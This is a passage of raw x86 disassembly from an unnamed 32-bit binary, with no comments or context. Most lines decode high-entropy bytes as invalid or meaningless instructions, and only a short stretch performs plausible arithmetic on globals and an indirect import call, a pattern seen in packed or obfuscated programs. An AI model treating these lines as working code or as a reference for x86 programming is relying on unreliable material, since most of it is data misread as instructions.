  40180b:	ja     0x4017e1
  40180d:	out    0xc2,eax
  40180f:	inc    ebx
  401810:	push   esi
  401811:	sbb    ecx,DWORD PTR [ebx]
  401813:	dec    esp
  401814:	adc    ebp,esi
  401816:	add    esi,esp
  401818:	add    ebx,DWORD PTR [edx+0x412cb740]
  40181e:	fcmovne st,st(0)
  401820:	in     al,0x99
  401822:	jno    0x401890
  401824:	dec    esi
  401825:	mov    DWORD PTR [ecx-0x5fdfe75],0x5bb82e97
  40182f:	pop    ss
  401830:	lahf   
  401831:	rcl    DWORD PTR [ebp+0x7a51499a],1
  401837:	mov    esp,0x7b7f9c72
  40183c:	xor    eax,DWORD PTR [esi+0x3a]
  40183f:	mov    bh,ch
  401841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401842:	jmp    0x40181f
  401844:	outs   dx,BYTE PTR ds:[esi]
  401845:	adc    cl,BYTE PTR [eax-0x48]
  401848:	push   0xffffff8e
  40184a:	fstp   QWORD PTR [ebx]
  40184c:	push   es
  40184d:	jb     0x401882
  40184f:	loope  0x401840
  401851:	pop    ss
  401852:	xor    DWORD PTR [eax-0x80],esp
  401855:	leave  
  401856:	adc    DWORD PTR [ecx-0x6cd5e41d],esi
  40185c:	xchg   ebp,eax
  40185d:	out    dx,al
  40185e:	xor    al,0xa
  401860:	mov    esp,0xbb3a3a25
  401865:	test   edi,ecx
  401867:	mov    al,ds:0x4e0964a7
  40186c:	inc    edx
  40186d:	adc    al,0x42
  40186f:	fsub   QWORD PTR [ebp-0x58]
  401872:	or     eax,DWORD PTR [edi+0x2c0ea0b2]
  401878:	ds mov ebx,0x377ba33f
  40187e:	mov    ds:0x30332a53,al
  401883:	dec    ebx
  401884:	lods   eax,DWORD PTR ds:[esi]
  401885:	pop    edx
  401886:	jecxz  0x40183f
  401888:	mov    dh,0xb
  40188a:	mov    ds:0xe092eb7f,eax
  40188f:	inc    edi
  401890:	sub    ecx,DWORD PTR [esi-0x36]
  401893:	dec    ebp
  401894:	stc    
  401895:	push   ebx
  401896:	mov    ah,0x9c
  401898:	(bad)  
  401899:	hlt    
  40189a:	cli    
  40189b:	cmp    ebx,esi
  40189d:	jl     0x401846
  40189f:	mov    bh,0x9d
  4018a1:	retf   
  4018a2:	xchg   edx,eax
  4018a3:	jecxz  0x40191a
  4018a5:	inc    esp
  4018a6:	push   edx
  4018a7:	sahf   
  4018a8:	aam    0x5a
  4018aa:	mov    esi,0x61dbcaf5
  4018af:	cmp    eax,0xeb564aca
  4018b4:	outs   dx,DWORD PTR ds:[esi]
  4018b5:	mov    ch,0x0
  4018b7:	push   esi
  4018b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018b9:	cli    
  4018ba:	rol    BYTE PTR [ecx-0xd],cl
  4018bd:	push   esp
  4018be:	jno    0x4018c3
  4018c0:	sbb    al,0x61
  4018c2:	enter  0x597c,0x11
  4018c6:	sti    
  4018c7:	stc    
  4018c8:	scas   al,BYTE PTR es:[edi]
  4018c9:	nop
  4018ca:	bound  esi,QWORD PTR [ecx+0x61]
  4018cd:	mov    DWORD PTR [ecx+0x8f31914],ebx
  4018d3:	ret    
  4018d4:	or     DWORD PTR [ebx+esi*2+0x6],0x844fca9e
  4018dc:	mov    ch,0x83
  4018de:	push   0x89376226
  4018e3:	or     BYTE PTR [ebx],ah
  4018e5:	test   BYTE PTR [ebx-0x58],al
  4018e8:	jno    0x401886
  4018ea:	out    dx,al
  4018eb:	jge    0x40191a
  4018ed:	inc    ecx
  4018ee:	ins    DWORD PTR es:[edi],dx
  4018ef:	push   ebx
  4018f0:	xlat   BYTE PTR ds:[ebx]
  4018f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018f2:	in     eax,0x29
  4018f4:	adc    dl,BYTE PTR [esi-0x168faa67]
  4018fa:	ss sub ebx,esi
  4018fd:	fwait
  4018fe:	pop    ds
  4018ff:	cld    
  401900:	mov    bl,BYTE PTR [esi]
  401902:	push   cs
  401903:	rol    DWORD PTR [edi-0x19],cl
  401906:	sub    DWORD PTR [esi+0x626594b0],eax
  40190c:	adc    al,0xd1
  40190e:	aam    0x52
  401910:	mov    eax,0x17d914f1
  401915:	jg     0x4018d1
  401917:	fmul   QWORD PTR [esi]
  401919:	xlat   BYTE PTR ds:[ebx]
  40191a:	mov    al,0x66
  40191c:	imul   DWORD PTR [eax+0x52]
  40191f:	lahf   
  401920:	jecxz  0x4018b2
  401922:	dec    edx
  401923:	xor    ebp,ecx
  401925:	pop    ss
  401926:	ss push cs
  401928:	sub    eax,esi
  40192a:	mov    dl,BYTE PTR [edx+eax*1-0x51]
  40192e:	xchg   ebx,eax
  40192f:	addr16 cdq 
  401931:	sub    eax,0x65ddd7c4
  401936:	push   ebx
  401937:	dec    eax
  401938:	ret    
  401939:	loope  0x401936
  40193b:	mov    bl,bl
  40193d:	xor    eax,0x47e19b14
  401942:	ds jns 0x4018f0
  401945:	fcomp  st(5)
  401947:	cmp    eax,0x3947d3a8
  40194c:	lock add BYTE PTR [ecx],cl
  40194f:	add    eax,0x1469fb2
  401954:	inc    eax
  401955:	ins    DWORD PTR es:[edi],dx
  401956:	inc    eax
  401957:	mov    esp,0x6cc74457
  40195c:	(bad)  
  40195d:	(bad)  
  40195e:	into   
  40195f:	pop    edx
  401960:	xchg   esp,eax
  401961:	call   0x16a9:0x6202b461
  401968:	mov    dl,0xb9
  40196a:	xchg   ebp,eax
  40196b:	fcmovnu st,st(4)
  40196d:	stc    
  40196e:	add    dh,BYTE PTR [ecx-0x6b]
  401971:	xor    eax,0x3574b3f5
  401976:	jmp    0x30f8:0xa8d19548
  40197d:	fcomp  DWORD PTR [ebp+0x210e3900]
  401983:	mov    al,ds:0xcb43b5b5
  401988:	cmp    BYTE PTR [eax-0x48db640b],bh
  40198e:	inc    ebp
  40198f:	ds add al,0x19
  401992:	loopne 0x401936
  401994:	out    dx,eax
  401995:	arpl   WORD PTR [eax+0x6fb5dae5],si
  40199b:	sbb    DWORD PTR [edx],esi
  40199d:	and    DWORD PTR [ebx],ecx
  40199f:	xor    DWORD PTR [ebx+ebp*8-0x9455e98],esp
  4019a6:	mov    BYTE PTR [esi+0x27],bh
  4019a9:	loop   0x401988
  4019ab:	and    ebx,DWORD PTR [eax]
  4019ad:	imul   esi,ebp,0x3f
  4019b0:	cmp    al,0xc2
  4019b2:	fs mov dh,0xf2
  4019b5:	jmp    0x507602c6
  4019ba:	aas    
  4019bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019bc:	nop
  4019bd:	xlat   BYTE PTR ds:[ebx]
  4019be:	data16 in al,0xaa
  4019c1:	add    al,0x1e
  4019c3:	mov    BYTE PTR [edx+0xa],al
  4019c6:	or     bl,BYTE PTR [eax]
  4019c8:	loop   0x401996
  4019ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019cb:	mov    ah,BYTE PTR [ebx+eiz*2+0x3d]
  4019cf:	shr    WORD PTR [ebx-0x14f892b4],1
  4019d6:	iret   
  4019d7:	pop    eax
  4019d8:	(bad)  
  4019da:	jl     0x4019b8
  4019dc:	add    al,0x3f
  4019de:	push   esi
  4019df:	repz scas eax,DWORD PTR es:[edi]
  4019e1:	call   0x1e0f:0x86abf35f
  4019e8:	sbb    eax,0x9ab87e0a
  4019ed:	inc    eax
  4019ee:	ss sbb eax,0xfe279899
  4019f4:	rcl    BYTE PTR [edx],1
  4019f6:	sbb    BYTE PTR [ebx+0x8dfca47],dl
  4019fc:	test   eax,0x939e15de
  401a01:	pop    ebp
  401a02:	or     DWORD PTR [ebp-0x642fd8c],esp
  401a08:	sub    cl,cl
  401a0a:	jns    0x4019c0
  401a0c:	int    0xe2
  401a0e:	jle    0x401a5d
  401a10:	jno    0x401a69
  401a12:	es cwde 
  401a14:	and    BYTE PTR [edx],cl
  401a16:	loopne 0x401a63
  401a18:	jge    0x4019c3
  401a1a:	fsub   st(0),st
  401a1c:	xlat   BYTE PTR ds:[ebx]
  401a1d:	(bad)  
  401a1e:	jecxz  0x401a7a
  401a20:	add    DWORD PTR [esi],0x1841b248
  401a26:	lea    ecx,[ebp+0x63]
  401a29:	jg     0x4019f0
  401a2b:	xchg   ecx,eax
  401a2c:	xor    al,0x3a
  401a2e:	fadd   QWORD PTR [ebx]
  401a30:	fild   DWORD PTR [eax-0x1757bccb]
  401a36:	enter  0x33ed,0x5d
  401a3a:	sub    eax,0xb6101c7f
  401a3f:	ins    DWORD PTR es:[edi],dx
  401a40:	add    DWORD PTR [ecx],esp
  401a42:	mov    edi,0x1e874a3
  401a47:	outs   dx,BYTE PTR ds:[esi]
  401a48:	pop    es
  401a49:	iret   
  401a4a:	fisub  DWORD PTR [edi]
  401a4c:	mov    ds:0x12685050,al
  401a51:	or     ebp,edx
  401a53:	and    al,0xff
  401a55:	xor    ebp,DWORD PTR cs:[edi-0x66]
  401a59:	cmp    eax,ecx
  401a5b:	cdq    
  401a5c:	jne    0x401add
  401a5e:	cmp    bh,cl
  401a60:	shr    DWORD PTR [edi],1
  401a62:	push   ds
  401a63:	mov    dl,0x91
  401a65:	pop    ebx
  401a66:	sub    al,0x7f
  401a68:	jecxz  0x401a6e
  401a6a:	fcmovne st,st(6)
  401a6c:	or     ebp,ecx
  401a6e:	jg     0x401a95
  401a70:	neg    DWORD PTR [ebx+eax*8+0x3829bde5]
  401a77:	push   edx
  401a78:	cmp    BYTE PTR [eax-0x57],0xb8
  401a7c:	jmp    DWORD PTR [edi+0x6b]
  401a7f:	mov    eax,ds:0xebbf6c6e
  401a84:	test   DWORD PTR [esi-0x4cd6f32],ecx
  401a8a:	call   FWORD PTR [edx+0x5a]
  401a8d:	mul    DWORD PTR [edx+0x1e2aec8d]
  401a93:	mov    ah,0xf
  401a95:	inc    esi
  401a96:	jmp    0xd44f:0xb33cc721
  401a9d:	mov    ebx,0xf3c2b65b
  401aa2:	enter  0x634b,0xa2
  401aa6:	fs dec edx
  401aa8:	js     0x401a91
  401aaa:	(bad)  
  401aab:	jmp    0x9d5018b
  401ab0:	mul    ah
  401ab2:	shl    BYTE PTR [edx+eiz*4-0x38],0x62
  401ab7:	iret   
  401ab8:	dec    esp
  401ab9:	sbb    eax,0xbe9cdd65
  401abe:	jns    0x401af6
  401ac0:	out    0xd1,al
  401ac2:	jmp    0xfbd1dbd3
  401ac7:	loop   0x401b1d
  401ac9:	add    edi,DWORD PTR [edi+0x15]
  401acc:	mov    WORD PTR [ecx-0xf806bf5],?
  401ad2:	dec    BYTE PTR es:[ebp-0x7eac52d8]
  401ad9:	js     0x401a5e
  401adb:	xchg   esi,eax
  401adc:	shr    edi,0x5e
  401adf:	mov    al,ds:0x5dacb646
  401ae4:	inc    eax
  401ae5:	pand   mm7,QWORD PTR [eax+esi*1-0x17]
  401aea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aeb:	call   0xbdbb33a7
  401af0:	ret    0x1a35
  401af3:	enter  0xcde0,0x74
  401af7:	popw   ds
  401af9:	inc    eax
  401afa:	dec    edi
  401afb:	test   al,0x41
  401afd:	sub    BYTE PTR [edi],0x6f
  401b00:	nop
  401b01:	sub    cl,BYTE PTR [edx]
  401b03:	dec    ecx
  401b04:	jmp    0xf362:0xdea64201
  401b0b:	push   edx
  401b0c:	mov    ds:0x76da9db1,eax
  401b11:	mov    eax,ds:0x91146a6c
  401b16:	aam    0x46
  401b18:	dec    ecx
  401b19:	xor    al,0xa5
  401b1b:	sub    BYTE PTR [edx+0x199d154],dl
  401b21:	add    eax,0x8679f41e
  401b26:	inc    ecx
  401b27:	lea    ebp,[edx+edi*8-0x1277f819]
  401b2e:	ins    DWORD PTR es:[edi],dx
  401b2f:	retf   0xb1ee
  401b32:	int    0x29
  401b34:	dec    esi
  401b35:	cli    
  401b36:	mov    eax,0xa40eb887
  401b3b:	jp     0x401b01
  401b3d:	mov    eax,0xc735dce0
  401b42:	mov    cl,0xac
  401b44:	xor    bl,BYTE PTR [ebx]
  401b46:	mov    ebx,0x20e824cb
  401b4b:	mov    ebx,0xe975f7f1
  401b50:	nop
  401b51:	mov    WORD PTR [edx+0x59ccaa4b],cs
  401b57:	jnp    0x401aff
  401b59:	xchg   edx,eax
  401b5a:	daa    
  401b5b:	pop    ecx
  401b5c:	pop    ecx
  401b5d:	bound  eax,QWORD PTR [edx]
  401b5f:	mov    bl,0x84
  401b61:	mov    esi,0xbdfd302
  401b66:	push   ecx
  401b67:	sub    dh,bl
  401b69:	add    eax,0x40568156
  401b6e:	or     BYTE PTR [eax+0x18],dl
  401b71:	xchg   esp,eax
  401b72:	mov    WORD PTR [ecx-0x5eb332f5],cs
  401b78:	lds    esi,FWORD PTR [eax-0xd0ae241]
  401b7e:	fsubr  QWORD PTR [ecx]
  401b80:	pushf  
  401b81:	(bad)  
  401b82:	lahf   
  401b83:	test   BYTE PTR [ebx],dh
  401b85:	fwait
  401b86:	sbb    eax,0x7dd29601
  401b8b:	mov    esi,0x23fea04e
  401b90:	and    edx,DWORD PTR [ecx+0x2a]
  401b93:	(bad)  
  401b94:	jp     0x401b1d
  401b96:	icebp  
  401b97:	and    dh,BYTE PTR [eax]
  401b99:	pop    eax
  401b9a:	jmp    0x1f12eee0
  401b9f:	sub    eax,0x7490a58c
  401ba4:	xor    bh,BYTE PTR [ebp+edx*8-0x18]
  401ba8:	(bad)  
  401ba9:	repnz xor DWORD PTR [ebx],ecx
  401bac:	imul   ebp,DWORD PTR [eax-0x52eef5e6],0x6
  401bb3:	test   BYTE PTR ds:0xfd9aca0,cl
  401bb9:	and    ebx,esp
  401bbb:	cmp    dh,ah
  401bbd:	jle    0x401c09
  401bbf:	mov    ecx,0x2fb6238b
  401bc4:	adc    BYTE PTR [edx],dh
  401bc6:	mov    al,0x41
  401bc8:	dec    ebx
  401bc9:	sar    BYTE PTR [eax+0x5ff6b4fe],1
  401bcf:	dec    ecx
  401bd0:	pop    ds
  401bd1:	mov    ch,0xe3
  401bd3:	mov    esp,0x4d8b56f7
  401bd8:	sbb    al,0xf
  401bda:	lods   al,BYTE PTR ds:[esi]
  401bdb:	enter  0xc102,0xe9
  401bdf:	add    dh,bh
  401be1:	ror    BYTE PTR [ebx-0x74b5e7b3],cl
  401be7:	push   ebp
  401be8:	sbb    al,0x33
  401bea:	mov    DWORD PTR [ecx+0x42297e15],0x4229a200
  401bf4:	add    BYTE PTR [ebx],dh
  401bf6:	rol    bh,cl
  401bf8:	add    eax,0x4229ae
  401bfd:	mov    bl,0x6b
  401bff:	add    BYTE PTR [eax],al
  401c01:	or     edx,eax
  401c03:	adc    DWORD PTR ds:0x422986,0x42289e
  401c0d:	mov    DWORD PTR [ebp-0x3c],edx
  401c10:	neg    eax
  401c12:	mov    DWORD PTR [ebp-0x70],0x2c55
  401c19:	mov    DWORD PTR [ebp-0x6c],0x456f
  401c20:	cmp    DWORD PTR ds:0x4229d2,0x0
  401c27:	mov    DWORD PTR ds:0x42289e,0x7b64
  401c31:	mov    DWORD PTR ds:0x42292a,0x2f7e
  401c3b:	mov    DWORD PTR ds:0x42289a,0x21f
  401c45:	mov    DWORD PTR ds:0x4229ce,0x3163
  401c4f:	jmp    0x401cb0
  401c54:	mov    DWORD PTR ds:0x4228ae,0x1734
  401c5e:	mov    eax,0x7b34
  401c63:	je     0x401c91
  401c69:	push   0x771c
  401c6e:	push   DWORD PTR [ebp-0x18]
  401c71:	call   DWORD PTR ds:0x42a040
  401c77:	and    DWORD PTR ds:0x422996,0x7212
  401c81:	sub    DWORD PTR ds:0x42297e,0x15ec
  401c8b:	and    DWORD PTR ds:0x42290e,ebx
  401c91:	or     DWORD PTR ds:0x42298a,0x1787
  401c9b:	xor    DWORD PTR ds:0x4229aa,0x7558
  401ca5:	mov    eax,ds:0x4228f6
  401caa:	sub    DWORD PTR ds:0x4228fa,eax
  401cb0:	mov    DWORD PTR [ebp-0x70],0x78a6
  401cb7:	movzx  eax,BYTE PTR ds:0x4229a2
  401cbe:	or     DWORD PTR ds:0x4228fe,eax
  401cc4:	jmp    0x40224e
  401cc9:	in     eax,dx
  401cca:	in     al,dx
  401ccb:	test   DWORD PTR [edi+esi*8-0x219a9b7c],0xb86e8adf
  401cd6:	daa    
  401cd7:	sbb    al,0x74
  401cd9:	push   0xfffffffa
  401cdb:	push   ss
  401cdc:	push   ss
  401cdd:	cmp    eax,0xcb161604
  401ce2:	pop    ds
  401ce3:	adc    bh,ch
  401ce5:	into   
  401ce6:	or     eax,0x12689733
  401ceb:	cmp    al,0xe1
  401ced:	popa   
  401cee:	xlat   BYTE PTR ds:[ebx]
  401cef:	inc    edi
  401cf0:	jmp    0x7b6237d9
  401cf5:	mov    dh,dl
  401cf7:	sbb    al,0x7e
  401cf9:	repz pop eax
  401cfb:	dec    ebp
  401cfc:	je     0x401d08
  401cfe:	dec    ebx
  401cff:	imul   ebx,DWORD PTR [esi-0x5e79a061],0xffffff81
  401d06:	xchg   esi,eax
  401d07:	or     ebx,esp
  401d09:	and    cl,BYTE PTR [ecx-0x7e]
  401d0c:	fwait
  401d0d:	xchg   ebx,eax
  401d0e:	leave  
  401d0f:	mov    ecx,0x93be4153
  401d14:	xchg   edx,eax
  401d15:	add    al,0x1d
  401d17:	sbb    eax,0xe0c8f48d
  401d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1d:	cwde   
  401d1e:	push   eax
  401d1f:	xlat   BYTE PTR ds:[ebx]
  401d20:	sub    eax,0x5e3ff0e5
  401d25:	pop    es
  401d26:	pop    ecx
  401d27:	xchg   DWORD PTR [ebp-0x56],edx
  401d2a:	xchg   ebp,eax
  401d2b:	and    BYTE PTR [edx+0x6f],cl
  401d2e:	push   esp
  401d2f:	pushf  
  401d30:	push   edx
  401d31:	pop    esi
  401d32:	or     eax,0xbb65d56
  401d37:	jb     0x401d49
  401d39:	shr    edi,1
  401d3b:	clc    
  401d3c:	ins    DWORD PTR es:[edi],dx
  401d3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d3e:	mov    dh,0x87
  401d40:	(bad)  
  401d41:	jo     0x401cff
  401d43:	fs pop ebx
  401d45:	mov    eax,0xcfdfc4c7
  401d4a:	jmp    0x401d4c
  401d4c:	repnz push es
  401d4e:	jo     0x401d7f
  401d50:	int    0xf0
  401d52:	jno    0x401d94
  401d54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d55:	mov    ds:0x6843768a,eax
  401d5a:	dec    ebp
  401d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d5c:	jns    0x401ce5
  401d5e:	jns    0x401d0e
  401d60:	sbb    si,sp
  401d63:	loopne 0x401d70
  401d65:	ffreep st(7)
  401d67:	mov    al,0xe5
  401d69:	xchg   esp,eax
  401d6a:	mov    gs,WORD PTR [ebp+0x2ccab2ea]
  401d70:	mov    ebx,0x4218f74f
  401d75:	inc    edi
  401d76:	jp     0x401d9b
  401d78:	into   
  401d79:	jne    0x401dd4
  401d7b:	imul   eax,DWORD PTR [ebp+0x69],0x834c6b1e
  401d82:	ins    BYTE PTR es:[edi],dx
  401d83:	and    BYTE PTR [edi-0x3a5e69ee],0x34
  401d8a:	daa    
  401d8b:	xor    al,0x60
  401d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d8e:	mov    ds,WORD PTR [ebx+0x49]
  401d91:	cmp    DWORD PTR [bp+di-0x21ad],0x6488f141
  401d9a:	shl    ebx,1
  401d9c:	dec    esp
  401d9d:	repz das 
  401d9f:	push   esp
  401da0:	and    eax,0x85f14258
  401da5:	sbb    esi,ebp
  401da7:	pop    esi
  401da8:	or     al,0x9
  401daa:	jb     0x401db0
  401dac:	stos   DWORD PTR es:[edi],eax
  401dad:	pop    esi
  401dae:	in     al,0x5
  401db0:	cli    
  401db1:	jno    0x401e0b
  401db3:	jbe    0x401d95
  401db5:	jo     0x401db8
  401db7:	jo     0x401d95
  401db9:	adc    eax,0x9600f226
  401dbe:	push   edi
  401dbf:	adc    esi,eax
  401dc1:	mov    WORD PTR [ebx-0x1ce355be],gs
  401dc7:	sub    al,0xf3
  401dc9:	outs   dx,BYTE PTR ds:[esi]
  401dca:	ins    BYTE PTR es:[edi],dx
  401dcb:	mov    cl,0x1f
  401dcd:	retf   
  401dce:	jmp    0x401e22
  401dd0:	mov    dh,0xb2
  401dd2:	sub    eax,0xb81d7b40
  401dd7:	sub    DWORD PTR [ebp+edi*8-0x76],ebp
  401ddb:	pop    edi
  401ddc:	clc    
  401ddd:	jl     0x401dc6
  401ddf:	aam    0xf3
  401de1:	das    
  401de2:	popa   
  401de3:	ja     0x401e1a
  401de5:	xlat   BYTE PTR ds:[ebx]
  401de6:	and    DWORD PTR [esi],0xe83d6e51
  401dec:	mov    ebx,0x3648c38f
  401df1:	xor    al,0xd1
  401df3:	or     al,0x65
  401df5:	dec    edx
  401df6:	ret    0xb3af
  401df9:	test   eax,0x68c05f1
  401dfe:	rcl    edx,cl
  401e00:	in     eax,dx
  401e01:	add    BYTE PTR [edi],dl
  401e03:	pop    esp
  401e04:	xor    BYTE PTR [edi],dl
  401e06:	sar    DWORD PTR [ebx+0x4be05297],1
  401e0c:	add    eax,0x40626c80
  401e11:	push   ebp
  401e12:	mov    ch,0x62
  401e14:	dec    edi
  401e15:	cmp    eax,0xb1dacb7a
  401e1a:	std    
  401e1b:	stos   BYTE PTR es:[edi],al
  401e1c:	iret   
  401e1d:	ja     0x401dd3
  401e1f:	xor    eax,eax
  401e21:	or     edx,esi
  401e23:	sub    DWORD PTR [esi],0xc237a557
  401e29:	es mov dl,0x86
  401e2c:	leave  
  401e2d:	rcl    BYTE PTR [esi],1
  401e2f:	ret    0x6afb
  401e32:	adc    dh,BYTE PTR gs:[edi]
  401e35:	push   eax
  401e36:	int3   
  401e37:	rcr    BYTE PTR [eax-0x34],0xaf
  401e3b:	gs push eax
  401e3d:	fucomip st,st(5)
  401e3f:	(bad)  
  401e40:	inc    ebx
  401e41:	fdiv   QWORD PTR [esi-0xe70873]
  401e47:	loop   0x401ea5
  401e49:	enter  0x6115,0xab
  401e4d:	ins    DWORD PTR es:[edi],dx
  401e4e:	push   es
  401e4f:	sbb    BYTE PTR [ecx-0x57],bl
  401e52:	pop    ebp
  401e53:	ja     0x401e21
  401e55:	jno    0x401deb
  401e57:	(bad)  
  401e58:	clc    
  401e59:	pop    esi
  401e5a:	shr    DWORD PTR [eax],cl
  401e5c:	xchg   ecx,eax
  401e5d:	cwde   
  401e5e:	popf   
  401e5f:	push   ss
  401e60:	fstp   DWORD PTR [esi]
  401e62:	xchg   esp,eax
  401e63:	aam    0x70
  401e65:	les    ebx,FWORD PTR [eax]
  401e67:	adc    DWORD PTR [edx-0x53ecbb59],ecx
  401e6d:	dec    edx
  401e6e:	xchg   ebx,eax
  401e6f:	dec    ecx
  401e70:	repz ds xchg edi,eax
  401e73:	mov    eax,DWORD PTR [edx+0x27]
  401e76:	call   0x72e1190d
  401e7b:	lods   eax,DWORD PTR ds:[esi]
  401e7c:	pop    ecx
  401e7d:	dec    esi
  401e7e:	shl    ecx,cl
  401e80:	cld    
  401e81:	ror    edx,0x1f
  401e84:	pop    ebp
  401e85:	(bad)  
  401e86:	pop    ss
  401e87:	popa   
  401e88:	mov    esi,0x263a5020
  401e8d:	pop    ds
  401e8e:	inc    ebx
  401e8f:	pusha  
  401e90:	ja     0x401e92
  401e92:	jmp    0x625503de
  401e97:	ret    
  401e98:	repnz leave 
  401e9a:	inc    edi
  401e9b:	push   ecx
  401e9c:	sbb    ecx,DWORD PTR [edx]
  401e9e:	mov    eax,ds:0x279561c5
  401ea3:	fs xchg ebx,eax
  401ea5:	stc    
  401ea6:	push   0xfffffff7
  401ea8:	add    ebp,eax
  401eaa:	hlt    
  401eab:	or     cl,BYTE PTR ss:[ecx]
  401eae:	inc    ebp
  401eaf:	stos   BYTE PTR es:[edi],al
  401eb0:	inc    ecx
  401eb1:	loop   0x401f09
  401eb3:	in     eax,0x93
  401eb5:	adc    esi,edx
  401eb7:	popf   
  401eb8:	pop    edx
  401eb9:	push   0xffffffa4
  401ebb:	xlat   BYTE PTR ds:[ebx]
  401ebc:	enter  0xc137,0x1f
  401ec0:	pop    ds
  401ec1:	or     bl,BYTE PTR [edx-0x34]
  401ec4:	icebp  
  401ec5:	and    ch,BYTE PTR [eax]
  401ec7:	and    cl,BYTE PTR [ebx-0x20bd39db]
  401ecd:	test   eax,0x69a86e2d
  401ed2:	mov    ch,0x33
  401ed4:	call   0xf4f5:0x19724b11
  401edb:	xchg   BYTE PTR [edx-0x48],bl
  401ede:	je     0x401efc
  401ee0:	push   ecx
  401ee1:	mov    dl,BYTE PTR [ebx-0x8924057]
  401ee7:	cwde   
  401ee8:	mov    ebx,0x68183b0f
  401eed:	sub    BYTE PTR [edx-0x82cb8f8],bh
  401ef3:	add    bl,ah
  401ef5:	adc    esi,DWORD PTR [esi+0x5c]
  401ef8:	inc    ebp
  401ef9:	(bad)  
  401efa:	mov    eax,ds:0x308d02ee
  401eff:	inc    edi
  401f00:	or     al,0xfd
  401f02:	stc    
  401f03:	mov    bl,0x74
  401f05:	addr16 imul esi,ecx,0x86ab0b45
  401f0c:	in     eax,dx
  401f0d:	push   esi
  401f0e:	fwait
  401f0f:	dec    ebx
  401f10:	clc    
  401f11:	xor    edx,DWORD PTR [edi+0x73ae2602]
  401f17:	and    ah,ah
  401f19:	outs   dx,BYTE PTR ds:[esi]
  401f1a:	and    ebp,DWORD PTR [ebx]
  401f1c:	push   esp
  401f1d:	inc    edx
  401f1e:	adc    ecx,edi
  401f20:	mov    DWORD PTR [edx-0x76],ecx
  401f23:	adc    ch,al
  401f25:	pop    esp
  401f26:	pop    ebp
  401f27:	test   BYTE PTR [edx+0x36],bh
  401f2a:	out    0x5c,eax
  401f2c:	enter  0x2b5,0x54
  401f30:	ja     0x401fac
  401f32:	(bad)  [ebx-0x6cfcb3ac]
  401f38:	sar    ah,cl
  401f3a:	cmp    cl,BYTE PTR [eax+ebp*1+0x1a432cb7]
  401f41:	sub    al,0x30
  401f43:	int    0x89
  401f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f46:	loop   0x401f35
  401f48:	mov    DWORD PTR [edi+0x74],eax
  401f4b:	jl     0x401f21
  401f4d:	jo     0x401f42
  401f4f:	add    eax,0x93f3bb24
  401f54:	aas    
  401f55:	inc    edx
  401f56:	stos   BYTE PTR es:[edi],al
  401f57:	or     eax,0xb4837235
  401f5c:	iret   
  401f5d:	std    
  401f5e:	mov    eax,0x4bfe9193
  401f63:	enter  0x716e,0xf0
  401f67:	xchg   ebx,eax
  401f68:	cmp    ecx,DWORD PTR [esi-0x56]
  401f6b:	add    eax,0xb45a7d06
  401f70:	lahf   
  401f71:	mov    WORD PTR [edx-0x252c7341],ss
  401f77:	pusha  
  401f78:	pop    edi
  401f79:	or     eax,ebx
  401f7b:	loope  0x401f07
  401f7d:	or     al,0x46
  401f7f:	pusha  
  401f80:	sub    esi,esi
  401f82:	fst    DWORD PTR ss:[ecx]
  401f85:	gs inc edx
  401f87:	or     eax,0x21722d0a
  401f8c:	dec    ecx
  401f8d:	pop    ecx
  401f8e:	mov    DWORD PTR [ebx+0x5b],esi
  401f91:	int    0x4a
  401f93:	clc    
  401f94:	mov    cl,0x67
  401f96:	push   ds
  401f97:	mov    ah,0x8f
  401f9a:	mov    DWORD PTR [eax-0x44],edx
  401f9d:	fist   DWORD PTR cs:[edi]
  401fa0:	add    edx,ebx
  401fa2:	fiadd  DWORD PTR [edi+0x71]
  401fa5:	test   al,0x8a
  401fa7:	mov    edi,0xebcbe1fb
  401fac:	std    
  401fad:	push   0x13
  401faf:	dec    edx
  401fb0:	icebp  
  401fb1:	adc    dh,0x64
  401fb4:	mov    al,ds:0xe3303807
  401fb9:	aaa    
  401fba:	shl    DWORD PTR [esi+0x7ad940a6],1
  401fc0:	inc    edx
  401fc1:	mov    ds:0x50e54333,al
  401fc6:	ret    
  401fc7:	inc    eax
  401fc8:	call   0x1ab9a5ca
  401fcd:	sbb    eax,0xf5370cf6
  401fd2:	and    eax,0x3ee956d6
  401fd7:	xchg   BYTE PTR [edx+0x74],ah
  401fda:	lods   eax,DWORD PTR ds:[esi]
  401fdb:	mov    ecx,0x8e74b72e
  401fe0:	mov    ah,cl
  401fe2:	dec    esp
  401fe3:	push   ebp
  401fe4:	and    DWORD PTR [eax],ebx
  401fe6:	dec    ebp
  401fe7:	mov    ebx,DWORD PTR [eax-0x50]
  401fea:	fild   DWORD PTR [eax+0x4065990b]
  401ff0:	adc    edi,edi
  401ff2:	test   al,0xc1
  401ff4:	sbb    DWORD PTR cs:[ebp-0x51],edi
  401ff8:	(bad)
  401ffc:	cmp    DWORD PTR [ecx-0x67],0x1d
  402000:	push   ds
  402001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402002:	sbb    DWORD PTR [ebx],eax
  402004:	mov    BYTE PTR [eax],bh
  402006:	test   DWORD PTR [ebx-0x2c2c4ab1],edx
  40200c:	or     DWORD PTR [edx],ecx
  40200e:	scas   al,BYTE PTR es:[edi]
  40200f:	repz cmp ecx,edx
  402012:	(bad)  
  402013:	mov    ds:0x20c5683d,al
  402018:	mov    ebx,0xb1c461d6
  40201d:	mov    dl,cl
  40201f:	enter  0xec8c,0x32
  402023:	push   ecx
  402024:	or     esi,edi
  402026:	sub    al,0x9b
  402028:	jae    0x402042
  40202a:	lea    edi,[ebp-0x6024d73e]
  402030:	in     eax,0x87
  402032:	sqrtps xmm7,XMMWORD PTR [ebp-0x6376ab34]
  402039:	add    al,0x79
  40203b:	lahf   
  40203c:	pusha  
  40203d:	jb     0x401fef
